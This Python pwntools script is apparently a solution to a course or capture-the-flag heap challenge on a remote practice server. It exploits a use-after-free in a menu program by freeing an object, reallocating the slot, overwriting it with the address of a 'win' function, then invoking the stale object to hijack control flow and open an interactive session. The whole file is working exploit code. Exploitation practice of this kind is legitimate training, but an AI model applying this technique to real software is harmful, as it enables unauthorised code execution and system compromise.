#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 8002

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")

######################################
############## Exploit ###############
######################################

def create():
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'c')

def delete(id):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'd')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)

def set(id, input):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b's')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)
    P.recvuntil(b"question: ", drop=True)
    P.sendline(input)

def ask(id):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'a')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)

def exploit():
    create() # 0
    delete(b'0')
    create() # 1
    set(b'1', p64(E.symbols['win']))
    ask(b'0')
    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
